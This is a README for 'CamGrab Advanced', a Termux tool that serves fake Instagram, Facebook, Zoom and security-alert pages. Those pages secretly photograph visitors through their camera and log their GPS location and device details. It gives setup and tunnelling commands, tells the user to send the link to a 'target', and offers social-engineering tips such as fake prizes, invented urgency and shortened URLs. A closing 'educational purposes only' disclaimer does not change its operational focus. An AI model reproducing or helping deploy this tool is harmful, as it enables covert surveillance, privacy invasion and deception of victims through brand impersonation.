# 📷 CamGrab Advanced v2.0

> **Advanced Camera Phishing Tool for Termux**  
> Capture photos, GPS location, and device information with multiple professional templates.

---

## ⚡ Features

### Core Features
- 🎯 **Multiple Phishing Templates** - Instagram, Facebook, Zoom, Security Alert
- 📸 **Auto Photo Capture** - Takes 3 high-quality photos automatically
- 🌍 **GPS Location Tracking** - Captures victim's precise coordinates
- 💻 **Device Fingerprinting** - Collects browser, OS, screen resolution, timezone
- 📊 **Detailed Logging** - JSON logs with timestamps and IP addresses
- 🔔 **Real-time Notifications** - Termux notifications on each capture
- 🌐 **Dual Tunnel Support** - Works with Ngrok or Cloudflared
- 🎨 **Interactive Menu** - Beautiful colored terminal interface
- ⚙️ **Auto Dependency Check** - Installs missing packages automatically

### Technical Features
- Silent camera capture (no preview shown)
- Async image uploads with device data
- Automatic file organization
- Session statistics on exit
- Clean error handling

---

## 📋 Requirements

### Essential
- **Termux** (Android terminal emulator)
- **PHP** - Web server for hosting pages
- **cURL** - For API requests
- **Ngrok** OR **Cloudflared** - For public tunneling

### Storage
- Internal storage access enabled (`termux-setup-storage`)

---

## 🚀 Quick Start

### 1. Clone Repository
```bash
git clone https://github.com/Mujaheed56/camgrab.git
cd camgrab
```

### 2. Grant Storage Permission
```bash
termux-setup-storage
```

### 3. Run Setup
```bash
chmod +x camgrab.sh
./camgrab.sh
```

The script will automatically:
- ✅ Check for dependencies
- ✅ Install missing packages
- ✅ Present template selection menu
- ✅ Start PHP server
- ✅ Generate public URL
- ✅ Monitor for captures

---

## 🎭 Available Templates

### 1. **Default Template**
Simple camera verification page

### 2. **Instagram Template**
- Instagram branding and colors
- "Camera Verification Required" message
- Professional gradient design

### 3. **Facebook Template**
- Facebook official styling
- Security warning alert
- "Unusual activity detected" scenario

### 4. **Zoom Template**
- Zoom meeting interface
- "Camera test before joining" theme
- Progress bar animation

### 5. **Security Alert Template**
- Generic security verification
- "Multiple failed login attempts" warning
- Professional security badge

---

## 🛠️ Installation Options

### Option A: Auto-Install (Recommended)
```bash
./camgrab.sh
# Follow on-screen prompts
```

### Option B: Manual Install
```bash
# Update packages
pkg update && pkg upgrade -y

# Install core dependencies
pkg install php curl -y

# Install Ngrok
wget https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-linux-arm64.tgz
tar -xvzf ngrok-v3-stable-linux-arm64.tgz
mv ngrok $PREFIX/bin/
rm ngrok-v3-stable-linux-arm64.tgz

# Configure Ngrok (get token from https://ngrok.com)
ngrok config add-authtoken YOUR_AUTHTOKEN

# OR install Cloudflared (alternative)
pkg install cloudflared -y
```

---

## 📖 Usage Guide

### Step 1: Launch Tool
```bash
./camgrab.sh
```

### Step 2: Select Template
Choose from 5 professional phishing templates using the interactive menu.

### Step 3: Get Public URL
The tool generates a public HTTPS URL (via Ngrok or Cloudflared).

### Step 4: Send Link
Share the link with your target via social engineering methods.

### Step 5: Monitor Captures
Watch real-time notifications as photos and data are captured.

### Step 6: Stop (CTRL+C)
Press `CTRL+C` to stop monitoring and view session statistics.

---

## 📂 Directory Structure

```
camgrab-advanced/
├── camgrab.sh              # Main executable script
├── camera.js               # Client-side capture logic
├── upload.php              # Server-side upload handler
├── index.html              # Default template
├── style.css               # Default styling
├── templates/              # Phishing templates
│   ├── instagram.html
│   ├── facebook.html
│   ├── zoom.html
│   └── security.html
├── camshots/               # Temp storage (auto-created)
├── logs/                   # Temp logs (auto-created)
└── README.md               # This file
```

### Output Directories (Android Storage)
```
/sdcard/CamGrabs/           # Main storage folder
├── *.jpg                   # Captured photos
└── logs/                   # Detailed logs
    ├── capture.log         # Main log file
    ├── device_*.json       # Device info
    └── location_*.json     # GPS coordinates
```

---

## 🔍 Captured Data

### Photos
- Format: JPEG (95% quality)
- Naming: `timestamp_index.jpg`
- Auto-moved to `/sdcard/CamGrabs/`

### Device Information
```json
{
  "userAgent": "Mozilla/5.0...",
  "platform": "Linux armv8l",
  "language": "en-US",
  "screenResolution": "1080x2400",
  "colorDepth": 24,
  "timezone": "America/New_York",
  "cookieEnabled": true,
  "timestamp": "2026-01-01T12:00:00.000Z"
}
```

### GPS Location
```json
{
  "latitude": 40.7128,
  "longitude": -74.0060,
  "accuracy": 10,
  "altitude": 50,
  "heading": null,
  "speed": null
}
```

---

## 🎯 Social Engineering Tips

### Effective Scenarios
1. **Prize Verification** - "Verify to claim your prize"
2. **Account Security** - "Unusual login detected"
3. **Meeting Join** - "Test camera before joining"
4. **Age Verification** - "Confirm you're 18+"
5. **Delivery Confirmation** - "Verify for package delivery"

### Best Practices
- ✅ Use HTTPS links (Ngrok/Cloudflared provides this)
- ✅ Shorten URLs with bit.ly or tinyurl
- ✅ Create urgency ("expires in 24 hours")
- ✅ Match template to scenario
- ⚠️ **EDUCATIONAL PURPOSES ONLY**

---

## ⚙️ Configuration

### Change Photo Count
Edit [camera.js](camera.js#L5):
```javascript
const PHOTO_COUNT = 3; // Change to desired number
```

### Change Capture Delay
Edit [camera.js](camera.js#L6):
```javascript
const DELAY_MS = 800; // Milliseconds between photos
```

### Change Storage Path
Edit [camgrab.sh](camgrab.sh#L16):
```bash
STORAGE_PATH="/sdcard/YourFolder"
```

---

## 🔧 Troubleshooting

### Issue: "Failed to generate tunnel URL"
**Solutions:**
- Check internet connection
- Verify Ngrok authtoken: `ngrok config add-authtoken YOUR_TOKEN`
- Try Cloudflared as alternative
- Check if port 8080 is available

### Issue: "Camera access denied"
**Causes:**
- Victim denied permission
- HTTPS not used (required for camera)
- Browser doesn't support camera API

### Issue: "Photos not saving"
**Solutions:**
- Run `termux-setup-storage` and grant permission
- Check `/sdcard/CamGrabs` exists
- Verify write permissions

### Issue: "PHP not found"
**Solution:**
```bash
pkg install php -y
```

---

## 📊 Session Statistics

On exit (CTRL+C), view:
- Total photos captured
- Number of log entries
- Storage location
- Capture timestamps

Example:
```
╔═══════════════════════════════════════╗
║           Session Summary            ║
╚═══════════════════════════════════════╝
Photos captured: 6
Logs collected: 2
[*] All data saved to /sdcard/CamGrabs
```

---

## 🔒 Security & Ethics

### ⚠️ DISCLAIMER
This tool is for **EDUCATIONAL PURPOSES ONLY**.  
Unauthorized access to someone's camera is **ILLEGAL** and violates privacy laws.

### Legal Use Cases
- ✅ Penetration testing with written authorization
- ✅ Security awareness training
- ✅ Personal research in controlled environment
- ✅ Educational demonstrations

### Illegal Activities
- ❌ Unauthorized surveillance
- ❌ Privacy invasion
- ❌ Identity theft
- ❌ Blackmail or harassment

**Developer is NOT responsible for misuse.**

---

## 🆘 Support & Updates

### Getting Help
- 📖 Read this README thoroughly
- 🐛 Check GitHub Issues
- 💬 Join Termux communities

### Contributing
Pull requests welcome! Please:
1. Fork the repository
2. Create feature branch
3. Test thoroughly
4. Submit PR with description

---

## 📜 License

MIT License - See LICENSE file for details

---

## 🙏 Credits

- Original concept inspired by social engineering research
- Built for Termux environment
- Uses standard web APIs (MediaDevices, Geolocation)

---

## 📝 Changelog

### v2.0 (2026-01-01)
- ✨ Added 5 professional phishing templates
- 🌍 GPS location tracking
- 💻 Device fingerprinting
- 🎨 Interactive colored menu
- ⚙️ Auto dependency installer
- 🔔 Real-time notifications
- 🌐 Cloudflared support
- 📊 Session statistics

### v1.0
- Basic camera capture
- Ngrok tunneling
- Single template

---

**Made with ❤️ for educational purposes**
